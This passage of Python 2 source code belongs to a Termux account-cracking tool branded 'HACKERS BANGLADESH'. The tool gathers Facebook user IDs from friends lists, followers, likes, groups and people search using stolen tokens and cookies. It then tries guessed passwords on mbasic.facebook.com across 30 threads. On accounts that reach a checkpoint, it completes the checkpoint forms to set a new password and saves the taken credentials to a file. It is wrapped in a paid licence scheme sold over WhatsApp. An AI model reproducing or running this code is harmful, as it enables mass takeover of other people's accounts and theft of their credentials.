            header = {'user-agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]', 'Host': 'mbasic.facebook.com', 
               'cache-control': 'max-age=0', 
               'upgrade-insecure-requests': '1', 
               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
               'accept-encoding': 'gzip, deflate', 
               'content-length': str(random.randint(100, 200)), 
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            respon = ses_dev.post('https://mbasic.facebook.com' + url_post, data=payloads, headers=header)
            batas = a + '+' + '-' * 46 + '+'
            bug = []
            if 'checkpoint' in respon.cookies:
                try:
                    sop_ = BeautifulSoup(respon.content, 'html.parser')
                    form = sop_.find('form')
                    url_post = form['action']
                    nh = sop_.find('input', attrs={'name': 'nh'})['value']
                    payloads = {}
                    for dev in form:
                        input = dev
                        payloads[input.get('name')] = input.get('value')

                    payloads.update({'submit[Continue]': 'Continue', 'nh': nh})
                    respon_ = ses_dev.post('https://mbasic.facebook.com' + url_post, data=payloads)
                    if san_dev == pw_new:
                        pw_new_ = pw_new + '000'
                    else:
                        pw_new_ = pw_new
                    if 'checkpointSecondaryButton' in respon_.text:
                        data = data.replace('CP', 'Yes').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                        bug.append('dev')
                        sop_dev = BeautifulSoup(respon_.content, 'html.parser')
                        form = sop_dev.find('form')
                        url_post_ = form['action']
                        submit = sop_dev.find('input', attrs={'name': 'submit[Yes]'})['value']
                        nh = sop_dev.find('input', attrs={'name': 'nh'})['value']
                        payload = {}
                        for dev in form:
                            input = dev
                            payload[input.get('name')] = input.get('value')

                        payload.update({'nh': nh, 'submit[Yes]': submit})
                        respon_2 = ses_dev.post('https://mbasic.facebook.com' + url_post_, data=payload)
                        if 'password_new' in respon_2.text:
                            sop_dev_2 = BeautifulSoup(respon_2.content, 'html.parser')
                            form = sop_dev_2.find('form')
                            url_post_2 = form['action']
                            submit_2 = sop_dev_2.find('input', attrs={'name': 'submit[Next]'})['value']
                            nh_2 = sop_dev_2.find('input', attrs={'name': 'nh'})['value']
                            payload = {}
                            for dev in form:
                                input = dev
                                payload[input.get('name')] = input.get('value')

                            payload.update({'nh': nh_2, 'submit[Next]': submit_2, 'password_new': pw_new_})
                            respon_3 = ses_dev.post('https://mbasic.facebook.com' + url_post_2, data=payload)
                            data_ = data.replace(san_dev, pw_new_)
                            if len(tap_yes) != 0:
                                data = h + '\r{' + a + 'Yes' + h + '}' + p + (' {:<15}\x1b[92;1m | \x1b[92;1m{}   ').format(eml_dev, san_dev)
                                data_ = data.replace(san_dev, pw_new_)
                                print h + '\r{' + k + '>/<' + h + '} Successfully Changing Password.. ' + p + '>_< Log Di Mbasic \n' + data_ + '\n' + batas
                                with open('earth_ok.txt', 'a') as (hasil):
                                    hasil.write(data_ + '\n')
                            else:
                                print h + '\r{' + k + '>/<' + h + '} Successfully Changing Password.. ' + p + '>_< Log Di Mbasic \n' + data_ + '\n' + batas
                                with open('earth_ok.txt', 'a') as (hasil):
                                    hasil.write(data_ + '\n')
                                hasil_ok.append(data_)
                                del hasil_cp[0]
                    sop = BeautifulSoup(respon_.content, 'html.parser')
                    select_dev = sop.find('select', attrs={'name': 'verification_method'})
                    c = 1
                    option_ = []
                    for dev in select_dev.find_all('option'):
                        option_.append('\n' + p + ' ' + str(c) + k + ' ' + dev.text)
                        c += 1

                    print p + data + ('').join(option_) + '\n' + batas
                except:
                    if len(bug) == 1:
                        bug = []
                    else:
                        print data + '\n' + batas

            elif 'checkpointSecondaryButton' in respon.text:
                data = data.replace('CP', 'Yes').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                print h + '\r Account Tap Yess.. ' + p + '>_< Login ID Mbasic \n' + a + data + '\n' + batas
            elif 'c_user' in respon.cookies:
                print h + '\r Account OK..\n' + a + data + '\n' + batas
            elif 'You are using an old password.' in respon.text:
                print m + '\r Using Old Password.....\n' + data + '\n' + batas
            elif '>>>' in iqbal:
                print data + '\n' + batas
    except:
        pass


hasil_cekpoint = []

def auto_dev():
    try:
        print a + '\n >>>' + p + ' Key' + h + ' CTRL+Z' + p + ' To stop Process\n'
        hasil_cek = open('earth_cp.txt', 'r').readlines()
        for dev in hasil_cek:
            hasil_cekpoint.append(dev.replace('\n', ''))

        with ThreadPoolExecutor(max_workers=30) as (dev):
            for data in hasil_cekpoint:
                try:
                    email = data.split()[1]
                    pw = data.split()[3]
                    dev.submit(cek_dev, email, pw, data)
                except:
                    pass

    except IOError:
        print k + '\n No Checkpoint Results yet..\n'
        exit()


def __pilih_crack__():
    try:
        print garis
        print p + ' [' + k + '1' + p + ']' + k + ' Crack' + h + ' Login Instagram Via Facebook'
        print p + ' [' + k + '2' + p + ']' + k + ' Crack' + h + ' Login Free Fire' + p + '(' + k + 'FF' + p + ')' + a + ' Via FB'
        print p + ' [' + k + '3' + p + ']' + k + ' Crack' + a + ' Login Mobile Legend' + p + '(' + k + 'MLBB' + p + ')' + a + ' Via FB'
        print p + ' [' + p + '4' + p + ']' + k + ' Crack API facebook' + a + '(' + p + 'fast Cracking' + a + ')' + h + '>> Super Pro'
        print p + ' [' + k + '5' + p + ']' + k + ' Crack' + h + ' Login Via facebook Mobile'
        print p + ' [' + k + '6' + p + ']' + k + ' Crack' + h + ' Login Via facebook' + k + ' Mbasic' + a + ' Pro..'
        print p + ' [' + k + '7' + p + ']' + k + ' Crack' + h + ' Login Via facebook Free'
        print garis
        pilih = raw_input(p + ' +>>>' + h + ' ')
        print p + ' [' + k + '*' + p + ']' + h + ' Proses Crack Running Background.. '
        print p + ' [' + k + '!' + p + ']' + h + ' Press CTRL+Z Key to Stop..!'
        print p + ' [' + k + '!' + p + ']' + h + ' If no Crack results appear.. '
        print p + ' [' + k + '!' + p + ']' + h + ' Turn Airplane Mode On/Off!'
        print ''
        if pilih == '1':
            instagram.append('IqbalDev')
            crack()
        elif pilih == '2':
            instagram.append('IqbalDev')
            log_ff_dev.append('IqbalDev')
            crack()
        elif pilih == '3':
            instagram.append('IqbalDev')
            log_ml_dev.append('IqbalDev')
            crack()
        elif pilih == '4':
            b_api.append('IqbalDev')
            crack()
        elif pilih == '5':
            mobile_crack.append('IqbalDev')
            crack()
        elif pilih == '6':
            log_mbasic_dev.append('IqbalDev')
            mobile_crack.append('IqbalDev')
            crack()
        elif pilih == '7':
            log_free_dev.append('IqbalDev')
            mobile_crack.append('IqbalDev')
            crack()
        else:
            __pilih_crack__()
    except KeyboardInterrupt:
        keluar()


def cek_akun_tumbal():
    print garis
    print h + '\n     Select Account Create Sacrifice!\n'
    try:
        token = open('akun_tumbal.txt', 'r').readlines()
    except IOError:
        print m + '\n No results yet...'
    else:
        try:
            token_ = []

            def list_(token):
                global ses_dev
                jml_tem = []
                c = 1
                with requests.Session() as (ses_dev):
                    for tok_dev in token:
                        try:
                            nama = ses_dev.get(('https://graph.facebook.com/me?access_token={}').format(tok_dev.strip('\n'))).json()['name']
                            data = ses_dev.get(('https://graph.facebook.com/me/friends?limit=5000&access_token={}').format(tok_dev.strip('\n'))).json()
                            for dev in data['data']:
                                try:
                                    jml_tem.append(dev['id'] + dev['name'])
                                except:
                                    pass

                            print h + ' [' + k + str(c) + h + '] ' + p + nama + a + ' > Friend: ' + k + str(len(jml_tem))
                            jml_tem = []
                            c += 1
                            token_.append(tok_dev)
                        except:
                            pass

                    open('akun_tumbal.txt', 'w').close()
                    for dev in token_:
                        with open('akun_tumbal.txt', 'a') as (masuk):
                            masuk.write(dev)

            with ThreadPoolExecutor(max_workers=30) as (dev_id):
                iqbal_tok = open('akun_tumbal.txt', 'r').readlines()
                dev_id.submit(list_, iqbal_tok)
            kon = True
            while kon:
                try:
                    print garis
                    pil = raw_input(a + ' [' + p + '?' + a + '] ' + p + 'Select' + k + ': ')
                    for dev in range(1, len(token_) + 1):
                        if int(pil) == dev:
                            kon = False
                            break

                except KeyboardInterrupt:
                    exit()
                except:
                    pass

            co = 1
            for dev in token_:
                if pil == str(co):
                    tokenz = token_.index(dev)
                    tokenku = token_[tokenz]
                co += 1

            nama = ses_dev.get(('https://graph.facebook.com/me?access_token={}').format(tokenku.strip('\n'))).json()['name']
            print a + '\n >_<' + p + ' Success Replace Sacrifice: ' + h + nama
            with open('token.txt', 'w') as (dev):
                iqbal = tokenku.strip('\n')
                dev.write(iqbal)
                jalankan_tool()
        except KeyError:
            print m + '\n :( Token Expire..'


def cek_token():
    global token
    try:
        token = open('token.txt', 'r').read()
    except IOError:
        login()
    else:
        try:
            with requests.Session() as (ses_):
                ses_.get(('https://graph.facebook.com/me?access_token={}').format(token)).json()['name']
        except KeyError:
            print m + '\n Token wrong...'
            hapus_data_login()
            login()
        except requests.exceptions.ConnectionError:
            exit(k + '\n Internet Connection Problem!')


def _yu_():
    global g
    try:
        with open('l.txt', 'a') as (te):
            te.write('.')
    except:
        pass

    g = open('l.txt', 'r').read()


def cek_cookie():
    global cookie
    try:
        c_user = open('cookie.txt', 'r').readlines()[0].strip('\n')
        fr = open('cookie.txt', 'r').readlines()[1].strip('\n')
        xs = open('cookie.txt', 'r').readlines()[2].strip('\n')
        sb = open('cookie.txt', 'r').readlines()[3].strip('\n')
        cookie = {'c_user': c_user, 'fr': fr, 'xs': xs, 
           'sb': sb}
    except:
        try:
            cok = open('cookie.txt').read()
            cookie = {'cookie': cok}
        except:
            if len(cek_cokie) == 1:
                print p + '\n >>>' + k + ' Must Login Cookies First!...\n'
                login_dengan_cookie_()
            else:
                login()


def banner():
    print '\n\x1b[1;92m    _          _\n\x1b[1;92m     \\        /\n\x1b[1;92m    __\\______/__\n\x1b[1;92m    | [\x1b[1;31;1m\xc2\xa9\x1b[1;92m]  [\x1b[1;31;1m\xc2\xa9\x1b[1;92m] |\xe2\x80\x8b\n \x1b[1;92m   |  [\x1b[1;33m====\x1b[1;92m]  | [+] HACKERS BANGLADESH [+]\n\x1b[1;92m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;31;1m\xe2\x96\x88\x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mAuthor(Recode):\x1b[1;92m James404_           \x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88\x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mWhatsapp      :\x1b[1;92m +96598064347        \x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88\x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mWhatsapp      :\x1b[1;92m  Black404_          \x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88\x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mGrup Fb       :\x1b[1;92m Termux Command World\x1b[1;31;1m \xe2\x96\x88\n\x1b[1;31;1m\xe2\x96\x88\x1b[1;92m [\xe2\x80\xa2] \x1b[1;31;1mVersion       :\x1b[1;92m 0.3                  \x1b[1;31;1m\xe2\x96\x88\n\x1b[1;92m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print h + '[1]' + p + ' IP: ' + k + ip
    print h + '[2]' + p + ' Version: ' + k + '1.8'


def login():
    try:
        user_agentzz_ = open('cokie.txt', 'r').read()
        user_agentzz = user_agentzz_.replace('|', '')
        user_agent_ = user_agentzz.split('A+ZZ')[0]
    except IOError:
        pass

    try:
        cokiez_ = open('cokiez.txt', 'r').read()
        cokiez1 = cokiez_.replace('1', '5').replace('0', '7')
        cokiez = '80' + cokiez1 + '04' + 'l'
    except IOError:
        pass

    try:
        ikuti_.append('IqbalDev')
        banner()
        print garis
        print p + '       [ LOGIN MENU ]'
        print garis
        print p + ' [' + k + '1' + p + ']' + h + ' Login With FB' + h + ' TOKEN'
        print p + ' [' + k + '2' + p + ']' + h + ' Login With FB' + h + ' Cookie'
        print p + ' [' + k + '3' + p + ']' + h + ' Login With FB' + h + ' Username & Password'
        print p + ' [' + k + '4' + p + ']' + h + ' Contact Owner' + h + ' Mr.James'
        print p + ' [' + k + '5' + p + ']' + h + ' How to get FB Cookies'
        try:
            if user_agent_ == cokiez:
                print p + ' [' + k + '6' + p + ']' + h + ' Crack From Search(No login)[Premium!]'
                print p + ' [' + k + '7' + p + ']' + h + ' Cheek Result CP'
                print p + ' [' + k + '8' + p + ']' + h + ' Cheek Result OK'
            else:
                print p + ' [' + k + '6' + p + ']' + h + ' Crack From Search(No login)[Premium!]'
                print p + ' [' + k + '7' + p + ']' + h + ' Cheek Result CP'
                print p + ' [' + k + '8' + p + ']' + h + ' Cheek Result OK'
        except:
            print p + ' [' + k + '6' + p + ']' + h + ' Crack From Search(No login)[Premium!]'
            print p + ' [' + k + '7' + p + ']' + h + ' Cheek Result CP'
            print p + ' [' + k + '8' + p + ']' + h + ' Cheek Result OK'

        print h + ' [' + p + '9' + h + ']' + m + ' Exit' + p + '...'
        print garis
        pilih = raw_input(h + ' [' + k + '!' + h + ']' + p + ' Select One : ')
        if pilih == '' or pilih == ' ' or pilih == '  ':
            keluar()
        if pilih == '1':
            login_dengan_token()
        if pilih == '2':
            login_dengan_cookie_()
        if pilih == '3':
            login_dengan_passwod()
        if pilih == '4':
            try:
                subprocess.check_output(['am', 'start', 'https://github.com/James404-cyber'])
                login()
            except:
                login()

        if pilih == '5':
            url_ytb = 'https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA'
            try:
                subprocess.check_output(['am', 'start', url_ytb])
                login()
            except:
                print p + '\n Link Vedio Fb Id: ' + h + url_ytb
                login()

        admin = k + '\n [>.] Please Contact Admin! \n' + h + '     No. Whatsapp Admin =>' + p + ' +96598064347'
        try:
            if user_agent_ == cokiez:
                if pilih == '6':
                    print garis
                    pencarian_pro()
                    sandi_dev()
                    __pilih_crack__()
                    print ''
                    print garis
                    exit('\n Done....\n')
                if pilih == '7':
                    seting_pw_tap_yes()
                    auto_dev()
                if pilih == '8':
                    cek_akun_tumbal()
            else:
                print m + '\n [' + k + '>.' + m + '] Not yet Premium...\n [' + k + '>!' + m + '] Must be Premium First.!'
                print admin
                login_dengan_token()
        except NameError:
            print m + '\n [' + k + '>.' + m + '] Not yet Premium.... \n [' + k + '>!' + m + '] Must be Premium First.!'
            print admin
            login_dengan_token()

        if pilih == '9':
            keluar()
        else:
            login()
    except KeyboardInterrupt:
        keluar()


def __yuk_yuk__(id_dev):
    deviv = id_dev.replace('1', '5').replace('0', '7')
    with open('cokie.txt', 'w') as (cok_dev):
        cok_dev.write('80' + deviv + '04')


def __yuk__(id_dev):
    with open('cokiez.txt', 'w') as (dev_):
        dev_.write(id_dev)


import base64, os

def __menu__(token):
    global ttl_
    try:
        import os
        banner()
        with requests.Session() as (ses_):
            nama = ses_.get(('https://graph.facebook.com/me?access_token={}').format(token)).json()
            print garis
            print h + ' [' + k + '*' + h + ']' + p + ' Hi:', a + '{' + p + nama['name'] + a + '}'
            print h + ' [' + k + '*' + h + ']' + p + ' ID :' + d, nama['id']
            try:
                if user_agent_ == cokiez:
                    print h + ' [' + k + '*' + h + ']' + p + ' Status:' + h + ' Premium*'
                    tgl = datetime.datetime.now()
                    bln = tgl.month
                    thn = tgl.year
                    day = tgl.day
                    du_ = open('cokie.txt', 'r').read()
                    du = du_.replace('|', '')
                    if 'A+ZZ' not in du:
                        with open('cokie.txt', 'a') as (tul):
                            tgl = str(thn) + ' ' + str(bln + 1) + ' ' + str(day)
                            data64 = base64.b64encode(tgl)
                            data32w = base64.b32encode(data64)
                            tul.write('A+ZZ' + data32w)
                    du_ = open('cokie.txt', 'r').read()
                    du = du_.replace('|', '')
                    try:
                        mase = du.split('A+ZZ')[1]
                    except:
                        mase = du.split() / wBro

                    dec32 = base64.b32decode(mase)
                    mas = base64.b64decode(dec32)
                    mas = mas.split()
                    mulai = date(int(mas[0]), int(mas[1]), int(mas[2]))
                    seles = date(thn, bln, day)
                    sisa = mulai - seles
                    lim_dev = str(sisa).split()[0]
                    if '|' in user_agentzz_:
                        print h + ' [' + k + '*' + h + ']' + p + ' Waktu: ' + h + 'Unlimited'
                    else:
                        if ':' in str(lim_dev) or '-' in str(lim_dev):
                            import os
                            print m + ' [!] You Have Exceeded The Usage Limit :( '
                            print m + ' [!] Please buy the license again to the admin!'
                            print p + ' [>] Contact Admin No WA:' + p + ' +96598064347'
                            os.system('del cokie.txt' if os.name == 'nt' else 'rm -f cokie.txt')
                            os.system('del cokiez.txt' if os.name == 'nt' else 'rm -f cokiez.txt')
                            with open('co.txt', 'w') as (t):
                                t.write('tai')
                            exit()
                        if int(lim_dev) > 24:
                            print h + ' [' + k + '*' + h + ']' + p + ' Time: ' + h + 'A month'
                        else:
                            print h + ' [' + k + '*' + h + ']' + p + ' Time: ' + h + lim_dev + p + ' More day'
                else:
                    print h + ' [' + k + '*' + h + ']' + p + ' Status:' + m + '  Premium*'
            except NameError:
                print h + ' [' + k + '*' + h + ']' + p + ' Status:' + m + '  Premium*'

            print garis
            print h + ' [' + k + '1' + h + ']' + h + ' Crack from friends list' + k + ' + TTL'
            try:
                if user_agent_ == cokiez:
                    print h + ' [' + k + '2' + h + ']' + h + ' Crack from Public/Friend From Friend'
                    print h + ' [' + k + '3' + h + ']' + h + ' Crack from Followers list'
                    print h + ' [' + k + '4' + h + ']' + h + ' Crack from Likes'
                    print h + ' [' + k + '5' + h + ']' + h + ' Crack from People Search'
                    print h + ' [' + k + '6' + h + ']' + h + ' Crack from People Search' + a + ' PRO'
                    print h + ' [' + k + '7' + h + ']' + h + ' Crack friends list from people search'
                    print h + ' [' + k + '8' + h + ']' + h + ' Crack from My Groups/Mass'
                    print h + ' [' + k + '9' + h + ']' + h + ' Cheek Resulr Crack'
                    print h + ' [' + k + '10' + h + ']' + h + ' Log Out Facebook'
                    print h + ' [' + k + '11' + h + ']' + h + ' Update Tool'
                    print h + ' [' + k + '12' + h + ']' + h + ' Setting User-Agent'
                    print h + ' [' + k + '13' + h + ']' + h + ' Open Game Login Page Via FB'
                    print h + ' [' + k + '14' + h + ']' + h + ' Check the Crack Checkpoint Results Session'
                    print h + ' [' + k + '15' + h + ']' + h + ' Replace Crack Live Results'
                    print h + ' [' + k + '16' + h + ']' + h + ' Exit..' + d
                else:
                    print h + ' [' + k + '2' + h + ']' + k + ' Crack from Public/Friend From Friend'
                    print h + ' [' + k + '3' + h + ']' + k + ' Crack from Followers list'
                    print h + ' [' + k + '4' + h + ']' + k + ' Crack from Likes'
                    print h + ' [' + k + '5' + h + ']' + k + ' Crack from People Search'
                    print h + ' [' + k + '6' + h + ']' + k + ' Crack from People Search' + a + ' PRO'
                    print h + ' [' + k + '7' + h + ']' + k + ' Crack friends list from people search'
                    print h + ' [' + k + '8' + h + ']' + k + ' Crack from My Groups/Mass'
                    print h + ' [' + k + '9' + h + ']' + k + ' Cheek Resulr Crack'
                    print h + ' [' + k + '10' + h + ']' + k + ' Log Out Facebook'
                    print h + ' [' + k + '11' + h + ']' + k + ' Update Tool'
                    print h + ' [' + k + '12' + h + ']' + k + ' Setting User-Agent'
                    print h + ' [' + k + '13' + h + ']' + k + ' Open Game Login Page Via FB'
                    print h + ' [' + k + '14' + h + ']' + k + ' Check the Crack Checkpoint Results Session'
                    print h + ' [' + k + '15' + h + ']' + k + ' Replace Crack Live Results'
                    print h + ' [' + k + '16' + h + ']' + k + ' Exit..' + d
            except:
                print h + ' [' + k + '2' + h + ']' + h + ' Crack from Public/Friend From Friend'
                print h + ' [' + k + '3' + h + ']' + h + ' Crack from Followers list'
                print h + ' [' + k + '4' + h + ']' + h + ' Crack from Likes'
                print h + ' [' + k + '5' + h + ']' + h + ' Crack from People Search'
                print h + ' [' + k + '6' + h + ']' + h + ' Crack from People Search' + a + ' PRO'
                print h + ' [' + k + '7' + h + ']' + h + ' Crack friends list from people search'
                print h + ' [' + k + '8' + h + ']' + h + ' Crack from My Groups/Mass'
                print h + ' [' + k + '9' + h + ']' + h + ' Cheek Resulr Crack'
                print h + ' [' + k + '10' + h + ']' + h + ' Log Out Facebook'
                print h + ' [' + k + '11' + h + ']' + h + ' Update Tool'
                print h + ' [' + k + '12' + h + ']' + h + ' Setting User-Agent'
                print h + ' [' + k + '13' + h + ']' + h + ' Open Game Login Page Via FB'
                print h + ' [' + k + '14' + h + ']' + h + ' Check the Crack Checkpoint Results Session'
                print h + ' [' + k + '15' + h + ']' + h + ' Replace Crack Live Results'
                print h + ' [' + k + '16' + h + ']' + h + ' Exit..' + d

            try:
                if user_agent_ == cokiez:
                    pass
                else:
                    print h + ' [' + k + '17' + h + ']' + h + ' Get Version' + h + ' PREMIUM'
            except NameError:
                print h + ' [' + k + '17' + h + ']' + h + ' Buy Version' + h + ' PREMIUM'

            print garis
            pilih = raw_input(p + ' >>> ' + h + '')
            beli_lisen = a + '\n [!]' + h + ' Upgrade to Premium version, and buy the License\n to Admin! to get complete features'
            if pilih == '1':
                try:
                    _yu_()
                    if len(g) < 5:
                        ttl_.append('dev')
                        user = 'me'
                        teman_teman_(token, user)
                        sandi_dev()
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                    elif user_agent_ == cokiez:
                        ttl_.append('dev')
                        user = 'me'
                        teman_teman_(token, user)
                        sandi_dev()
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                    else:
                        print beli_lisen
                        exit()
                except KeyboardInterrupt:
                    exit()
                except:
                    print beli_lisen
                    exit()

            try:
                if user_agent_ == cokiez:
                    if pilih == '2' and pillih == angka:
                        ttl_.append('dev')
                        user = raw_input(h + '\n [' + p + '*' + h + ']' + p + ' Enter Target Public Id' + k + ': ')
                        teman_teman_(token, user)
                        sandi_dev()
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                    elif pilih == '3' and pillih == angka:
                        ttl_.append('dev')
                        user = raw_input(h + '\n [' + p + '*' + h + ']' + p + ' Enter Target Profile Id' + k + ': ')
                        pengikut(token, user)
                        sandi_dev()
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                    elif pilih == '4' and pillih == angka:
                        id_postingan = raw_input(h + '\n [' + p + '*' + h + ']' + p + ' Enter Posting Id' + k + ': ')
                        likez(token, id_postingan)
                        sandi_dev()
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                    elif pilih == '5' and pillih == angka:
                        cek_cokie.append('dev')
                        cek_cookie()
                        ttl_.append('dev')
                        keyword = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Search People' + h + ': ')
                        jumlah = input(h + ' [' + p + '?' + h + ']' + p + ' Enter Limit' + k + ': ')
                        u_orang = ('https://mbasic.facebook.com/search/people/?q={}').format(keyword)
                        cari_orang(jumlah, u_orang, cookie)
                        print ''
                        sandi_dev()
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                        exit()
                    elif pilih == '6' and pillih == angka:
                        print garis
                        pencarian_pro()
                        sandi_dev()
                        __pilih_crack__()
                        print ''
                        print garis
                        exit('\n Done....\n')
                    elif pilih == '7' and pillih == angka:
                        ttl_.append('dev')
                        cek_cokie.append('dev')
                        cek_cookie()
                        cari_teman.append(1)
                        keyword = raw_input(h + '\n [' + p + '?' + h + ']' + p + ' Cari orang untk ambil list temannya' + k + ': ')
                        jumlah = 2
                        u_orang = ('https://mbasic.facebook.com/search/people/?q={}').format(keyword)
                        cari_orang(jumlah, u_orang, cookie)
                    elif pilih == '8' and pillih == angka:
                        cek_cokie.append('dev')
                        cek_cookie()
                        ttl_.append('dev')
                        my_grup(token)
                        print ''
                        for dev in set(data_user):
                            user_id.append(dev)
                            print h + '\r [' + p + '*' + h + ']' + p + ' Duplicate Data Filter' + h + ': ' + str(len(user_id)),
                            sys.stdout.flush()

                        sandi_dev()
                        print ''
                        __pilih_crack__()
                        print '\n', garis, p + 'Done...'
                        exit()
                    elif pilih == '15' and pillih == angka:
                        cek_akun_tumbal()
                else:
                    try:
                        if pilih == '2' or pilih == '3' or pilih == '4' or pilih == '5' or pilih == '6' or pilih == '7' or pilih == '8' or pilih == '15':
                            if user_agent_ == cokiez:
                                pass
                            else:
                                print beli_lisen
                    except:
                        print beli_lisen

            except:
                try:
                    if pilih == '2' or pilih == '3' or pilih == '4' or pilih == '5' or pilih == '6' or pilih == '7' or pilih == '8' or pilih == '15':
                        if user_agent_ == cokiez:
                            pass
                        else:
                            print beli_lisen
                except:
                    print beli_lisen

            if pilih == '9':
                cek_hasil()
            if pilih == '10':
                sub_pil = raw_input(h + '\n [' + p + '*' + h + ']' + p + ' Log Out From Facebook?' + k + '[y/n]' + p + ': ')
                if sub_pil == 'yes' or sub_pil == 'y':
                    print k + '\n Log Out of Facebook..\n'
                    hapus_data_login()
                    exit()
                elif sub_pil == 'no' or sub_pil == 'n':
                    __menu__(token)
                else:
                    keluar()
            if pilih == '11':
                import os
                try:
                    os.system('git clone https://github.com/James404-cyber/UserCrack')
                    os.system('rm -rf UserCrack.py')
                    os.system('cp -f UserCrack/UserCrack.py \\.')
                    os.system('rm -rf UserCrack')
                    print h + '\n Successful Update Tool..' + p + '>_<\n'
                    time.sleep(2)
                    jalankan_tool()
                except KeyboardInterrupt:
                    print m + '\n Your device is not supported!\n'
                    jalankan_tool()

            if pilih == '12':
                __seting_ua_dev__()
            if pilih == '13':
                __seting_login_fb_game__()
            if pilih == '14':
                seting_pw_tap_yes()
                auto_dev()
            if pilih == '16':
                keluar()
            try:
                if user_agent_ == cokiez:
                    pass
                else:
                    data = uhu
            except NameError:
                if pilih == '17':
                    print garis
                    print beli_lisen
                    no_ = '+96598064347'
                    print '\n  How to get this Tool License,\n  You just follow the directions,\n  first Chat admin first, and\n  send the ID listed on\n  the message you will send later,\n  to be registered by admin,\n  Press Enter further\n  to' + h + ' Whatsapp' + p + ' For Admin Chat\n ' + k + ' Pay ->,' + h + ' Via Bekash Only\n'
                    raw_input(a + ' [!]' + h + ' Press Enter To Continue Chat Admin!')
                    id__ = nama['id']
                    lisen_salah = m + '\n Wrong License, Please Buy License to Admin!'
                    try:
                        id_me = open('cokiez.txt', 'r').read()
                        if id_me != str(id__):
                            print ' Not the same'
                            id__ = id_me
                    except IOError:
                        pass

                    try:
                        data = open('cokiez.txt', 'r').read()
                    except IOError:
                        __yuk__(id__)
                        __yuk_yuk__(id__)

                    try:
                        print k + '\n ! ' + p + 'Chat Admin To Buy License!'
                        print k + ' ! ' + p + 'Give this ID to Admin: ' + h + id__
                        print p + '   To Register....'
                        print h + '   ==>' + p + ' This is No. Wa Admin: ' + k + no_
                        print ''
                        try:
                            duit = open('co.txt', 'r')
                            subprocess.check_output(['am', 'start', 'https://wa.me/' + no_ + '?text=*MY%20ID:%20' + id__ + "*\nAssalamu'alaikum%20Bro,%20Hi%James %20Bro! "])
                        except:
                            subprocess.check_output(['am', 'start', 'https://wa.me/' + no_ + '?text=*MY%20ID:%20' + id__ + "*\nAssalamu'alaikum%20Bro,%20Hi%20James%20Bro! "])

                    except:
                        print a + '\n [!]' + p + ' Please Chat Admin To Buy License!\n     !Don not forget to send this ID=> ' + h + id__
                        print a + ' [*]' + p + ' This is the admins whatsapp number: ' + h + no_

                    try:
                        __yuk_yuk__(id__)
                        try:
                            f = raw_input(h + '\n [' + k + '!' + h + ']' + p + ' Enter the License Here ' + k + '--> ')
                            dec32 = base64.b32decode(f)
                            dec64 = base64.b64decode(dec32)
                        except TypeError:
                            print m + '\n Wrong Bro....!'
                            hapus_cokie()
                            exit()

                        try:
                            de = dec64.replace('A', '')
                            if de == open('cokie.txt', 'r').read():
                                print h + '\n Successful... ' + p + '>_<\n'
                                cokie = open('cokie.txt', 'r').read()
                                with open('cokie.txt', 'w') as (gans_):
                                    gans_.write(cokie + 'l')
                                tgl = datetime.datetime.now()
                                bln = tgl.month
                                thn = tgl.year
                                day = tgl.day
                                with open('cokie.txt', 'a') as (tul):
                                    tgls = str(thn) + ' ' + str(bln + 1) + ' ' + str(day)
                                    if '12' in str(bln):
                                        bln = 1
